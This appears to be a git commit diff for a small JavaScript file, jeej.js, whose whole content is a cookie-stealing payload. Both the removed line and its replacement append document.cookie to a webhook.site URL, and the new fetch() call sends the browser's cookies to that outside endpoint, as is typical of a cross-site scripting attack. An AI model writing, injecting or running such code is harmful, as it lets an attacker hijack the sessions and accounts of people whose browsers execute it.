b20d73314217bc9818959b9d40537ff0589f3faa
goulgoul <antoine.goulin@proton.me>
2024-03-10 01:08:34 +0100

    quick push

--- jeej.js
+++ jeej.js
@@ -1,1 +1,9 @@
-const request = new Request("https://webhook.site/cc817732-d84a-4db7-a328-1bb70ebdfbcc?cookie=" + document.cookie);
+const url = "https://webhook.site/cc817732-d84a-4db7-a328-1bb70ebdfbcc?cookie=" + document.cookie;
+
+fetch(url).then(function(response) {
+  return response.json();
+}).then(function(data) {
+  console.log(data);
+}).catch(function(err) {
+  console.log('Fetch Error :-S', err);
+});
